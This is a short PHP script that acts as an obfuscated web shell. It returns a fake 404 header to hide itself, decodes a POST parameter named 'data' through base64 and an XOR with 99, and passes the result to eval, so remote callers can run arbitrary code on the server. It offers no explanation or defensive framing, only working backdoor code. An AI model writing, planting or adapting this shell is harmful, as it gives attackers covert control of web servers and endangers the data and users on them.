<?php
$pass = "data";
$number = 99;
header("HTTP/1.1 404 Not Found");
function decoder($s,$number){
	$res = '';
	$s = rtrim(base64_decode($s),'/');
	$s = explode('/', $s);
	foreach ($s as $key => $value) {
		$res .= chr($value^$number);
	}
	return base64_decode($res);
}
foreach($_POST as $k => $v){
	if($k == $pass) { continue; }
	$_POST[$k] = decoder($v, $number);
}
@eval(decoder($_POST[$pass], $number));
?>
